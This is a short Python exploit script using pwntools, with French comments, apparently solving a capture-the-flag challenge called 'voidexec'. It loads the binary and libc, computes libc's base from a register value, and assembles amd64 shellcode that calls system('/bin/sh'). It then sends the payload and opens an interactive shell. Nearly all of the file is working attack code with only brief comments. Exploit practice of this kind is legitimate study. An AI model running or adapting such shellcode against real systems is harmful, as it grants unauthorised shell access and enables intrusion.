#!/usr/bin/env python3

from pwn import *

# Connexion locale ou à distance
p = process("./voidexec")

bin = ELF("./voidexec")
libc = ELF("./libc.so.6")

context.arch = 'amd64'
context.os   = 'linux'

rcx_value        = 0x7ffff7d1e8bb # Quand on entre dans le code qu'on injecte en local, voici l'adresse de rcx. C'est une adresse dans la libc. On peut donc calculer la base de libc avec.  
base_libc_local  = 0x7ffff7fc6000

# Calcul de l’offset à ajouter à rcx pour retomber sur la base libc.
offset_to_base   = base_libc_local - rcx_value  # = 0x2a5f65 environ, positif

# L’offset absolu de system() depuis le début de la libc.
offset_system    = libc.symbols["system"]       # Par ex. 0x50d70 ou autre

shellcode = asm(f"""
    add   rcx, {offset_to_base:#x}
    add   rcx, {offset_system:#x}
    sub   rcx, 0x3c6000
    xor   rax, rax
    mov   rax, rcx

    mov rdx, 0x68732f6e69622f
    push rdx

    mov   rdi, rsp
    xor   rsi, rsi
    xor   rdx, rdx

    call  rax
""")

print(f"Shellcode: {shellcode}")

# Envoi du payload
p.send(shellcode)

p.interactive()  # On obtient un shell !
